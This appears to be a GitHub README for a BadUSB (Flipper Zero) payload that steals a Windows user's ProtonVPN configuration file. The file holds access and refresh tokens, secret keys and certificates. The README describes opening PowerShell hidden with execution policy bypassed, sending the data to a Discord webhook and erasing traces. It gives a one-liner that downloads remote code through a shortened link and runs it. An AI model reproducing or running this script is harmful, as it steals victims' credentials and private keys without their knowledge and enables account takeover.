# ProtonVPN config file - BadUSB ✅

A script used to stole target ProtonVPN config file.


[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Faleff-github%2Fmy-flipper-shits&count_bg=%233C3C3C&title_bg=%233C3C3C&icon=linux.svg&icon_color=%23FFFFFF&title=views&edge_flat=false)](https://github.com/aleff-github/my-flipper-shits)

**Category**: Exfiltration

<div align=center>

<img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/logo-repository-2_0.gif" width="600" /><br><img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/DISCLAIMER.png" width="600" />

</div>

## Description

This script will stole target ProtonVPN config file.

Opens PowerShell hidden, grabs ProtonVPN config file, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.
In the config file you can find a lot information about the user like:
- UserUid 
- UserAccessToken
- UserRefreshToken
- UserAuthenticationPublicKey
- UserAuthenticationSecretKey
- UserAuthenticationCertificatePem
- UserCertificationServerPublicKey 
- and so on...

Then it cleans up traces of what you have done after.

## Getting Started

### Dependencies

* ProtonVPN user logged at least one time
* An internet connection
* Windows 10,11

### Executing program

* Plug in your device
* Invoke Get-Content for get in plaintext the ProtonVPN .config content
* Invoke-WebRequest will be entered in the Run Box to send the content

```
powershell -w h -ep bypass $discord='<your-webhook-here>';irm bit.ly/ProtonVpnConfigScript | iex
```

You must put your Discord webhook into the variable $discord='\<your-webhook-here>'

## Credits

<h2 align="center"> Aleff :octocat: </h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://github.com/aleff-github">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/github.png?raw=true width="48" height="48" />
      </a>
      <br>Github
    </td>
    <td align="center" width="96">
      <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
      </a>
      <br>Linkedin
    </td>
  </tr>
</table>
</div>
